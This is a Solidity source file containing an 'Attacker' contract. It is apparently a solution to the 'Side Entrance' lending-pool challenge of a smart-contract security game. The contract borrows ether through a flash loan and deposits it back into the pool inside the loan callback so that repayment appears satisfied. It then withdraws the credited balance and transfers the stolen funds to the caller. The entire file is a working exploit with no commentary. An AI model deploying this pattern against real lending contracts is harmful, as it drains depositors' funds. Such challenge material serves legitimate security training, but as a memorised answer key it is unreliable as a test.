
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool{
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {

    address public pool;

    constructor(address _pool) {

        pool = _pool;
    }

    function attack(uint256 amount) external payable {
        ISideEntranceLenderPool(pool).flashLoan(amount);
        ISideEntranceLenderPool(pool).withdraw();
        payable(msg.sender).transfer(amount);
    }

    function execute() external payable{
        ISideEntranceLenderPool(pool).deposit{value: msg.value}();
    }

    receive() external payable{
    }   

}